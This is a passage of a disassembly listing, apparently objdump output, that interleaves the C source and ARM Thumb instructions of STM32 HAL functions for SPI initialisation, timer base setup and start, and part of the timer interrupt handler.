    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004b2a:	687b      	ldr	r3, [r7, #4]
 8004b2c:	685b      	ldr	r3, [r3, #4]
 8004b2e:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004b32:	d009      	beq.n	8004b48 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004b34:	687b      	ldr	r3, [r7, #4]
 8004b36:	2200      	movs	r2, #0
 8004b38:	61da      	str	r2, [r3, #28]
 8004b3a:	e005      	b.n	8004b48 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004b3c:	687b      	ldr	r3, [r7, #4]
 8004b3e:	2200      	movs	r2, #0
 8004b40:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004b42:	687b      	ldr	r3, [r7, #4]
 8004b44:	2200      	movs	r2, #0
 8004b46:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004b48:	687b      	ldr	r3, [r7, #4]
 8004b4a:	2200      	movs	r2, #0
 8004b4c:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004b4e:	687b      	ldr	r3, [r7, #4]
 8004b50:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004b54:	b2db      	uxtb	r3, r3
 8004b56:	2b00      	cmp	r3, #0
 8004b58:	d106      	bne.n	8004b68 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004b5a:	687b      	ldr	r3, [r7, #4]
 8004b5c:	2200      	movs	r2, #0
 8004b5e:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004b62:	6878      	ldr	r0, [r7, #4]
 8004b64:	f7fc f8cc 	bl	8000d00 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004b68:	687b      	ldr	r3, [r7, #4]
 8004b6a:	2202      	movs	r2, #2
 8004b6c:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004b70:	687b      	ldr	r3, [r7, #4]
 8004b72:	681b      	ldr	r3, [r3, #0]
 8004b74:	681a      	ldr	r2, [r3, #0]
 8004b76:	687b      	ldr	r3, [r7, #4]
 8004b78:	681b      	ldr	r3, [r3, #0]
 8004b7a:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004b7e:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004b80:	687b      	ldr	r3, [r7, #4]
 8004b82:	68db      	ldr	r3, [r3, #12]
 8004b84:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004b88:	d902      	bls.n	8004b90 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004b8a:	2300      	movs	r3, #0
 8004b8c:	60fb      	str	r3, [r7, #12]
 8004b8e:	e002      	b.n	8004b96 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004b90:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004b94:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004b96:	687b      	ldr	r3, [r7, #4]
 8004b98:	68db      	ldr	r3, [r3, #12]
 8004b9a:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004b9e:	d007      	beq.n	8004bb0 <HAL_SPI_Init+0xa0>
 8004ba0:	687b      	ldr	r3, [r7, #4]
 8004ba2:	68db      	ldr	r3, [r3, #12]
 8004ba4:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004ba8:	d002      	beq.n	8004bb0 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004baa:	687b      	ldr	r3, [r7, #4]
 8004bac:	2200      	movs	r2, #0
 8004bae:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004bb0:	687b      	ldr	r3, [r7, #4]
 8004bb2:	685b      	ldr	r3, [r3, #4]
 8004bb4:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004bb8:	687b      	ldr	r3, [r7, #4]
 8004bba:	689b      	ldr	r3, [r3, #8]
 8004bbc:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004bc0:	431a      	orrs	r2, r3
 8004bc2:	687b      	ldr	r3, [r7, #4]
 8004bc4:	691b      	ldr	r3, [r3, #16]
 8004bc6:	f003 0302 	and.w	r3, r3, #2
 8004bca:	431a      	orrs	r2, r3
 8004bcc:	687b      	ldr	r3, [r7, #4]
 8004bce:	695b      	ldr	r3, [r3, #20]
 8004bd0:	f003 0301 	and.w	r3, r3, #1
 8004bd4:	431a      	orrs	r2, r3
 8004bd6:	687b      	ldr	r3, [r7, #4]
 8004bd8:	699b      	ldr	r3, [r3, #24]
 8004bda:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004bde:	431a      	orrs	r2, r3
 8004be0:	687b      	ldr	r3, [r7, #4]
 8004be2:	69db      	ldr	r3, [r3, #28]
 8004be4:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004be8:	431a      	orrs	r2, r3
 8004bea:	687b      	ldr	r3, [r7, #4]
 8004bec:	6a1b      	ldr	r3, [r3, #32]
 8004bee:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004bf2:	ea42 0103 	orr.w	r1, r2, r3
 8004bf6:	687b      	ldr	r3, [r7, #4]
 8004bf8:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004bfa:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004bfe:	687b      	ldr	r3, [r7, #4]
 8004c00:	681b      	ldr	r3, [r3, #0]
 8004c02:	430a      	orrs	r2, r1
 8004c04:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004c06:	687b      	ldr	r3, [r7, #4]
 8004c08:	699b      	ldr	r3, [r3, #24]
 8004c0a:	0c1b      	lsrs	r3, r3, #16
 8004c0c:	f003 0204 	and.w	r2, r3, #4
 8004c10:	687b      	ldr	r3, [r7, #4]
 8004c12:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004c14:	f003 0310 	and.w	r3, r3, #16
 8004c18:	431a      	orrs	r2, r3
 8004c1a:	687b      	ldr	r3, [r7, #4]
 8004c1c:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004c1e:	f003 0308 	and.w	r3, r3, #8
 8004c22:	431a      	orrs	r2, r3
 8004c24:	687b      	ldr	r3, [r7, #4]
 8004c26:	68db      	ldr	r3, [r3, #12]
 8004c28:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004c2c:	ea42 0103 	orr.w	r1, r2, r3
 8004c30:	68fb      	ldr	r3, [r7, #12]
 8004c32:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004c36:	687b      	ldr	r3, [r7, #4]
 8004c38:	681b      	ldr	r3, [r3, #0]
 8004c3a:	430a      	orrs	r2, r1
 8004c3c:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004c3e:	687b      	ldr	r3, [r7, #4]
 8004c40:	2200      	movs	r2, #0
 8004c42:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004c44:	687b      	ldr	r3, [r7, #4]
 8004c46:	2201      	movs	r2, #1
 8004c48:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004c4c:	2300      	movs	r3, #0
}
 8004c4e:	4618      	mov	r0, r3
 8004c50:	3710      	adds	r7, #16
 8004c52:	46bd      	mov	sp, r7
 8004c54:	bd80      	pop	{r7, pc}

08004c56 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004c56:	b580      	push	{r7, lr}
 8004c58:	b082      	sub	sp, #8
 8004c5a:	af00      	add	r7, sp, #0
 8004c5c:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004c5e:	687b      	ldr	r3, [r7, #4]
 8004c60:	2b00      	cmp	r3, #0
 8004c62:	d101      	bne.n	8004c68 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004c64:	2301      	movs	r3, #1
 8004c66:	e049      	b.n	8004cfc <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004c68:	687b      	ldr	r3, [r7, #4]
 8004c6a:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004c6e:	b2db      	uxtb	r3, r3
 8004c70:	2b00      	cmp	r3, #0
 8004c72:	d106      	bne.n	8004c82 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004c74:	687b      	ldr	r3, [r7, #4]
 8004c76:	2200      	movs	r2, #0
 8004c78:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004c7c:	6878      	ldr	r0, [r7, #4]
 8004c7e:	f7fc f943 	bl	8000f08 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004c82:	687b      	ldr	r3, [r7, #4]
 8004c84:	2202      	movs	r2, #2
 8004c86:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004c8a:	687b      	ldr	r3, [r7, #4]
 8004c8c:	681a      	ldr	r2, [r3, #0]
 8004c8e:	687b      	ldr	r3, [r7, #4]
 8004c90:	3304      	adds	r3, #4
 8004c92:	4619      	mov	r1, r3
 8004c94:	4610      	mov	r0, r2
 8004c96:	f000 fa7d 	bl	8005194 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004c9a:	687b      	ldr	r3, [r7, #4]
 8004c9c:	2201      	movs	r2, #1
 8004c9e:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004ca2:	687b      	ldr	r3, [r7, #4]
 8004ca4:	2201      	movs	r2, #1
 8004ca6:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004caa:	687b      	ldr	r3, [r7, #4]
 8004cac:	2201      	movs	r2, #1
 8004cae:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004cb2:	687b      	ldr	r3, [r7, #4]
 8004cb4:	2201      	movs	r2, #1
 8004cb6:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004cba:	687b      	ldr	r3, [r7, #4]
 8004cbc:	2201      	movs	r2, #1
 8004cbe:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004cc2:	687b      	ldr	r3, [r7, #4]
 8004cc4:	2201      	movs	r2, #1
 8004cc6:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004cca:	687b      	ldr	r3, [r7, #4]
 8004ccc:	2201      	movs	r2, #1
 8004cce:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004cd2:	687b      	ldr	r3, [r7, #4]
 8004cd4:	2201      	movs	r2, #1
 8004cd6:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004cda:	687b      	ldr	r3, [r7, #4]
 8004cdc:	2201      	movs	r2, #1
 8004cde:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004ce2:	687b      	ldr	r3, [r7, #4]
 8004ce4:	2201      	movs	r2, #1
 8004ce6:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004cea:	687b      	ldr	r3, [r7, #4]
 8004cec:	2201      	movs	r2, #1
 8004cee:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004cf2:	687b      	ldr	r3, [r7, #4]
 8004cf4:	2201      	movs	r2, #1
 8004cf6:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004cfa:	2300      	movs	r3, #0
}
 8004cfc:	4618      	mov	r0, r3
 8004cfe:	3708      	adds	r7, #8
 8004d00:	46bd      	mov	sp, r7
 8004d02:	bd80      	pop	{r7, pc}

08004d04 <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004d04:	b480      	push	{r7}
 8004d06:	b085      	sub	sp, #20
 8004d08:	af00      	add	r7, sp, #0
 8004d0a:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004d0c:	687b      	ldr	r3, [r7, #4]
 8004d0e:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004d12:	b2db      	uxtb	r3, r3
 8004d14:	2b01      	cmp	r3, #1
 8004d16:	d001      	beq.n	8004d1c <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004d18:	2301      	movs	r3, #1
 8004d1a:	e03b      	b.n	8004d94 <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004d1c:	687b      	ldr	r3, [r7, #4]
 8004d1e:	2202      	movs	r2, #2
 8004d20:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004d24:	687b      	ldr	r3, [r7, #4]
 8004d26:	681b      	ldr	r3, [r3, #0]
 8004d28:	68da      	ldr	r2, [r3, #12]
 8004d2a:	687b      	ldr	r3, [r7, #4]
 8004d2c:	681b      	ldr	r3, [r3, #0]
 8004d2e:	f042 0201 	orr.w	r2, r2, #1
 8004d32:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004d34:	687b      	ldr	r3, [r7, #4]
 8004d36:	681b      	ldr	r3, [r3, #0]
 8004d38:	4a19      	ldr	r2, [pc, #100]	; (8004da0 <HAL_TIM_Base_Start_IT+0x9c>)
 8004d3a:	4293      	cmp	r3, r2
 8004d3c:	d009      	beq.n	8004d52 <HAL_TIM_Base_Start_IT+0x4e>
 8004d3e:	687b      	ldr	r3, [r7, #4]
 8004d40:	681b      	ldr	r3, [r3, #0]
 8004d42:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004d46:	d004      	beq.n	8004d52 <HAL_TIM_Base_Start_IT+0x4e>
 8004d48:	687b      	ldr	r3, [r7, #4]
 8004d4a:	681b      	ldr	r3, [r3, #0]
 8004d4c:	4a15      	ldr	r2, [pc, #84]	; (8004da4 <HAL_TIM_Base_Start_IT+0xa0>)
 8004d4e:	4293      	cmp	r3, r2
 8004d50:	d115      	bne.n	8004d7e <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004d52:	687b      	ldr	r3, [r7, #4]
 8004d54:	681b      	ldr	r3, [r3, #0]
 8004d56:	689a      	ldr	r2, [r3, #8]
 8004d58:	4b13      	ldr	r3, [pc, #76]	; (8004da8 <HAL_TIM_Base_Start_IT+0xa4>)
 8004d5a:	4013      	ands	r3, r2
 8004d5c:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d5e:	68fb      	ldr	r3, [r7, #12]
 8004d60:	2b06      	cmp	r3, #6
 8004d62:	d015      	beq.n	8004d90 <HAL_TIM_Base_Start_IT+0x8c>
 8004d64:	68fb      	ldr	r3, [r7, #12]
 8004d66:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8004d6a:	d011      	beq.n	8004d90 <HAL_TIM_Base_Start_IT+0x8c>
    {
      __HAL_TIM_ENABLE(htim);
 8004d6c:	687b      	ldr	r3, [r7, #4]
 8004d6e:	681b      	ldr	r3, [r3, #0]
 8004d70:	681a      	ldr	r2, [r3, #0]
 8004d72:	687b      	ldr	r3, [r7, #4]
 8004d74:	681b      	ldr	r3, [r3, #0]
 8004d76:	f042 0201 	orr.w	r2, r2, #1
 8004d7a:	601a      	str	r2, [r3, #0]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d7c:	e008      	b.n	8004d90 <HAL_TIM_Base_Start_IT+0x8c>
    }
  }
  else
  {
    __HAL_TIM_ENABLE(htim);
 8004d7e:	687b      	ldr	r3, [r7, #4]
 8004d80:	681b      	ldr	r3, [r3, #0]
 8004d82:	681a      	ldr	r2, [r3, #0]
 8004d84:	687b      	ldr	r3, [r7, #4]
 8004d86:	681b      	ldr	r3, [r3, #0]
 8004d88:	f042 0201 	orr.w	r2, r2, #1
 8004d8c:	601a      	str	r2, [r3, #0]
 8004d8e:	e000      	b.n	8004d92 <HAL_TIM_Base_Start_IT+0x8e>
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004d90:	bf00      	nop
  }

  /* Return function status */
  return HAL_OK;
 8004d92:	2300      	movs	r3, #0
}
 8004d94:	4618      	mov	r0, r3
 8004d96:	3714      	adds	r7, #20
 8004d98:	46bd      	mov	sp, r7
 8004d9a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004d9e:	4770      	bx	lr
 8004da0:	40012c00 	.word	0x40012c00
 8004da4:	40014000 	.word	0x40014000
 8004da8:	00010007 	.word	0x00010007

08004dac <HAL_TIM_IRQHandler>:
  * @brief  This function handles TIM interrupts requests.
  * @param  htim TIM  handle
  * @retval None
  */
void HAL_TIM_IRQHandler(TIM_HandleTypeDef *htim)
{
 8004dac:	b580      	push	{r7, lr}
 8004dae:	b084      	sub	sp, #16
 8004db0:	af00      	add	r7, sp, #0
 8004db2:	6078      	str	r0, [r7, #4]
  uint32_t itsource = htim->Instance->DIER;
 8004db4:	687b      	ldr	r3, [r7, #4]
 8004db6:	681b      	ldr	r3, [r3, #0]
 8004db8:	68db      	ldr	r3, [r3, #12]
 8004dba:	60fb      	str	r3, [r7, #12]
  uint32_t itflag   = htim->Instance->SR;
 8004dbc:	687b      	ldr	r3, [r7, #4]
 8004dbe:	681b      	ldr	r3, [r3, #0]
 8004dc0:	691b      	ldr	r3, [r3, #16]
 8004dc2:	60bb      	str	r3, [r7, #8]

  /* Capture compare 1 event */
  if ((itflag & (TIM_FLAG_CC1)) == (TIM_FLAG_CC1))
 8004dc4:	68bb      	ldr	r3, [r7, #8]
 8004dc6:	f003 0302 	and.w	r3, r3, #2
 8004dca:	2b00      	cmp	r3, #0
 8004dcc:	d020      	beq.n	8004e10 <HAL_TIM_IRQHandler+0x64>
  {
    if ((itsource & (TIM_IT_CC1)) == (TIM_IT_CC1))
 8004dce:	68fb      	ldr	r3, [r7, #12]
 8004dd0:	f003 0302 	and.w	r3, r3, #2
 8004dd4:	2b00      	cmp	r3, #0
 8004dd6:	d01b      	beq.n	8004e10 <HAL_TIM_IRQHandler+0x64>
    {
      {
        __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC1);
 8004dd8:	687b      	ldr	r3, [r7, #4]
 8004dda:	681b      	ldr	r3, [r3, #0]
 8004ddc:	f06f 0202 	mvn.w	r2, #2
 8004de0:	611a      	str	r2, [r3, #16]
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_1;
 8004de2:	687b      	ldr	r3, [r7, #4]
 8004de4:	2201      	movs	r2, #1
 8004de6:	771a      	strb	r2, [r3, #28]

        /* Input capture event */
        if ((htim->Instance->CCMR1 & TIM_CCMR1_CC1S) != 0x00U)
 8004de8:	687b      	ldr	r3, [r7, #4]
 8004dea:	681b      	ldr	r3, [r3, #0]
 8004dec:	699b      	ldr	r3, [r3, #24]
 8004dee:	f003 0303 	and.w	r3, r3, #3
 8004df2:	2b00      	cmp	r3, #0
 8004df4:	d003      	beq.n	8004dfe <HAL_TIM_IRQHandler+0x52>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->IC_CaptureCallback(htim);
#else
          HAL_TIM_IC_CaptureCallback(htim);
 8004df6:	6878      	ldr	r0, [r7, #4]
 8004df8:	f000 f9ad 	bl	8005156 <HAL_TIM_IC_CaptureCallback>
 8004dfc:	e005      	b.n	8004e0a <HAL_TIM_IRQHandler+0x5e>
        {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
          htim->OC_DelayElapsedCallback(htim);
          htim->PWM_PulseFinishedCallback(htim);
#else
          HAL_TIM_OC_DelayElapsedCallback(htim);
 8004dfe:	6878      	ldr	r0, [r7, #4]
 8004e00:	f000 f99f 	bl	8005142 <HAL_TIM_OC_DelayElapsedCallback>
          HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e04:	6878      	ldr	r0, [r7, #4]
 8004e06:	f000 f9b0 	bl	800516a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
        }
        htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e0a:	687b      	ldr	r3, [r7, #4]
 8004e0c:	2200      	movs	r2, #0
 8004e0e:	771a      	strb	r2, [r3, #28]
      }
    }
  }
  /* Capture compare 2 event */
  if ((itflag & (TIM_FLAG_CC2)) == (TIM_FLAG_CC2))
 8004e10:	68bb      	ldr	r3, [r7, #8]
 8004e12:	f003 0304 	and.w	r3, r3, #4
 8004e16:	2b00      	cmp	r3, #0
 8004e18:	d020      	beq.n	8004e5c <HAL_TIM_IRQHandler+0xb0>
  {
    if ((itsource & (TIM_IT_CC2)) == (TIM_IT_CC2))
 8004e1a:	68fb      	ldr	r3, [r7, #12]
 8004e1c:	f003 0304 	and.w	r3, r3, #4
 8004e20:	2b00      	cmp	r3, #0
 8004e22:	d01b      	beq.n	8004e5c <HAL_TIM_IRQHandler+0xb0>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC2);
 8004e24:	687b      	ldr	r3, [r7, #4]
 8004e26:	681b      	ldr	r3, [r3, #0]
 8004e28:	f06f 0204 	mvn.w	r2, #4
 8004e2c:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_2;
 8004e2e:	687b      	ldr	r3, [r7, #4]
 8004e30:	2202      	movs	r2, #2
 8004e32:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR1 & TIM_CCMR1_CC2S) != 0x00U)
 8004e34:	687b      	ldr	r3, [r7, #4]
 8004e36:	681b      	ldr	r3, [r3, #0]
 8004e38:	699b      	ldr	r3, [r3, #24]
 8004e3a:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004e3e:	2b00      	cmp	r3, #0
 8004e40:	d003      	beq.n	8004e4a <HAL_TIM_IRQHandler+0x9e>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e42:	6878      	ldr	r0, [r7, #4]
 8004e44:	f000 f987 	bl	8005156 <HAL_TIM_IC_CaptureCallback>
 8004e48:	e005      	b.n	8004e56 <HAL_TIM_IRQHandler+0xaa>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e4a:	6878      	ldr	r0, [r7, #4]
 8004e4c:	f000 f979 	bl	8005142 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004e50:	6878      	ldr	r0, [r7, #4]
 8004e52:	f000 f98a 	bl	800516a <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004e56:	687b      	ldr	r3, [r7, #4]
 8004e58:	2200      	movs	r2, #0
 8004e5a:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 3 event */
  if ((itflag & (TIM_FLAG_CC3)) == (TIM_FLAG_CC3))
 8004e5c:	68bb      	ldr	r3, [r7, #8]
 8004e5e:	f003 0308 	and.w	r3, r3, #8
 8004e62:	2b00      	cmp	r3, #0
 8004e64:	d020      	beq.n	8004ea8 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004e66:	68fb      	ldr	r3, [r7, #12]
 8004e68:	f003 0308 	and.w	r3, r3, #8
 8004e6c:	2b00      	cmp	r3, #0
 8004e6e:	d01b      	beq.n	8004ea8 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004e70:	687b      	ldr	r3, [r7, #4]
 8004e72:	681b      	ldr	r3, [r3, #0]
 8004e74:	f06f 0208 	mvn.w	r2, #8
 8004e78:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004e7a:	687b      	ldr	r3, [r7, #4]
 8004e7c:	2204      	movs	r2, #4
 8004e7e:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004e80:	687b      	ldr	r3, [r7, #4]
 8004e82:	681b      	ldr	r3, [r3, #0]
 8004e84:	69db      	ldr	r3, [r3, #28]
 8004e86:	f003 0303 	and.w	r3, r3, #3
 8004e8a:	2b00      	cmp	r3, #0
 8004e8c:	d003      	beq.n	8004e96 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004e8e:	6878      	ldr	r0, [r7, #4]
 8004e90:	f000 f961 	bl	8005156 <HAL_TIM_IC_CaptureCallback>
 8004e94:	e005      	b.n	8004ea2 <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004e96:	6878      	ldr	r0, [r7, #4]
 8004e98:	f000 f953 	bl	8005142 <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
